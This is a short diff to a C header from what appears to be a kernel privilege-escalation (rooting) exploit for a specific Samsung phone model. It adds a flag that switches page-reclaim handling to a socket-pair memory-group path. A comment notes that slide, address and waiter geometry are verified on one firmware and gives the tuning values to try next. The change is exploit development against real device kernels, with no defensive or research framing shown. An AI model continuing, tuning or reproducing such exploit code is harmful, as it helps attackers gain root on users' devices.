@@ -124,6 +124,13 @@
 #define SLIDE_STACK_WRITER_MCAST 1
 #define MCAST_WAITER_OFF 0x78
 #define APP_CLOSED_FOPS_ROUTE 1
+/* Reclaim experiment (09-29): match the rooting S918B profile. Slide,
+ * address, alias, and waiter geometry are all verified on FZG1 now; the
+ * remaining unverified link is which physical page the bank lands in.
+ * This switches prepare_kernel_page to the controlled socket-pair
+ * mm-group path (cf. util.c controlled_reclaim_*). If step-4 flips,
+ * follow with PIPE_MAX_ATTEMPTS 12 + APP_SLIDE_RECLAIM_SENDS 64. */
+#define APP_CONTROLLED_MM_GROUP_RECLAIM 1
 #define APP_FOPS_ROUTE_FINE_DELAY_TICKS \
   0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL
 #define APP_FOPS_BEFORE_PIPE 1
